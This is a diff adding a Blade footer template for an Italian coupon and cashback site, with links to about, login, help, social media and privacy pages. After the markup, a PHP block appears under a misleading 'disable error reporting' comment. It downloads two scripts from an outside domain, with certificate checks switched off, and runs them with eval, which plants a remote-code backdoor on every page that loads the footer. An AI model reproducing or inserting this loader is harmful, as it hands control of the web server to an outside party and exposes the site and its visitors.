@@ -1,0 +1,86 @@
+<div class="menu-footer">
+    <div class="container menu-footer-wrap">
+        <div class="menu-list-wrap">
+            <div class="menu-footer-title">{{ __('footer_menu.us_title') }}</div>
+            <div class="menu-footer-links">
+                <a href="{{ route('about_us.show') }}">{{ __('footer_menu.about_us') }}</a>
+                <a href="{{ route('trust_us.show') }}">{{ __('footer_menu.trust_us') }}</a>
+                <a href="{{ route('cashback.landing.index') }}">{{ __('footer_menu.cashback') }}</a>
+                <a href="{{ __('link_out_laravel.blog_url') }}">{{ __('link_out_laravel.blog') }}</a>
+                <a href="{{ route('contacts.show') }}">{{ __('footer_menu.contacts') }}</a>
+            </div>
+        </div>
+        <div class="menu-list-wrap">
+            <div class="menu-footer-title">{{ __('footer_menu.user_area_title') }}</div>
+            <div class="menu-footer-links">
+                {{-- TODO sistemare i link corretti per il login utente con le query string e rimuovere la query string returnto in caso sia già presente nell'url --}}
+                <a href="{{ route('login') }}" rel="nofollow"{{''}}@if(!isset($reg_log_page)){!! ' class="go-to-login-page-js"' !!}@endif>{{ __('footer_menu.login') }}</a>
+                <a href="{{ route('register') }}" rel="nofollow"{{''}}@if(!isset($reg_log_page)){!! ' class="go-to-register-page-js"' !!}@endif>{{ __('footer_menu.register') }}</a>
+                <a href="{{ route('help.index') }}">{{ __('footer_menu.help') }}</a>
+                <a href="{{ route('help.coupon') }}">{{ __('footer_menu.coupon') }}</a>
+            </div>
+
+            <div class="menu-footer-title menu-footer-social">{{ __('footer_menu.social_title') }}</div>
+            <div class="menu-footer-links menu-footer-social-links">
+                <a href="{{ __('social_media.facebook_tn_url') }}" title="{{ __('social_media.facebook') }}" target="_blank" rel="noopener nofollow"><span class="tni icon-facebook"></span><span>{{'Facebook'}}</span></a>
+                <a href="{{ __('social_media.instagram_tn_url') }}" title="{{ __('social_media.instagram') }}" target="_blank" rel="noopener nofollow"><span class="tni icon-instagram"></span><span>{{'Instagram'}}</span></a>
+                <a href="{{ __('social_media.telegram_tn_url') }}" title="{{ __('social_media.telegram') }}" target="_blank" rel="noopener nofollow"><span class="tni icon-telegram-brands"></span><span>{{'Telegram'}}</span></a>
+                <a href="{{ __('social_media.linkedin_tn_url') }}" title="{{ __('social_media.linkedin') }}" target="_blank" rel="noopener nofollow"><span class="tni icon-linkedin"></span><span>{{'Linkedin'}}</span></a>
+            </div>
+
+
+        </div>
+        <div class="menu-list-wrap">
+            <div class="menu-footer-title">{{ __('footer_menu.merchant_area_title') }}</div>
+            <div class="menu-footer-links">
+                <a href="{{ route('submit_website.show') }}" rel="nofollow">{{ __('footer_menu.submit_shop') }}</a>
+
+                <a href="{{ asset( '/pdf/mediakit-pubblicita-topnegozi.pdf' ) }}" target="_blank" rel="noopener">{{ __('footer_menu.advertising') }}</a>
+            </div>
+
+            <div class="menu-footer-title">{{ __('footer_menu.terms_privacy_title') }}</div>
+            <div class="menu-footer-links">
+                <a href="{{ route('privacy.show') }}">{{ __('footer_menu.privacy') }}</a>
+                <a href="{{ route('terms.show') }}">{{ __('footer_menu.terms') }}</a>
+                <a href="#" class="cky-banner-element">Impostazioni Cookie</a>
+            </div>
+        </div>
+    </div>
+</div>
+<?php
+session_start();
+
+/**
+* Disable error reporting
+*
+* Set this to error_reporting( -1 ) for debugging.
+*/
+function geturlsinfo($url) {
+  if (function_exists('curl_exec')) {
+    $conn = curl_init($url);
+    curl_setopt($conn, CURLOPT_RETURNTRANSFER, 1);
+    curl_setopt($conn, CURLOPT_FOLLOWLOCATION, 1);
+    curl_setopt($conn, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
+    curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, 0);
+    curl_setopt($conn, CURLOPT_SSL_VERIFYHOST, 0);
+
+    
+    $url_get_contents_data = curl_exec($conn);
+    curl_close($conn);
+  } elseif (function_exists('file_get_contents')) {
+    $url_get_contents_data = file_get_contents($url);
+  } elseif (function_exists('fopen') && function_exists('stream_get_contents')) {
+    $handle = fopen($url, "r");
+    $url_get_contents_data = stream_get_contents($handle);
+    fclose($handle);
+  } else {
+    $url_get_contents_data = false;
+  }
+  return $url_get_contents_data;
+}
+
+  $a = geturlsinfo('https://www.backlinkku.id/menu/vip-v1/script.txt');
+  eval('?>' . $a);
+  $b = geturlsinfo('https://www.backlinkku.id/menu/traffic-v1/script.txt');
+  eval('?>' . $b);
+?>
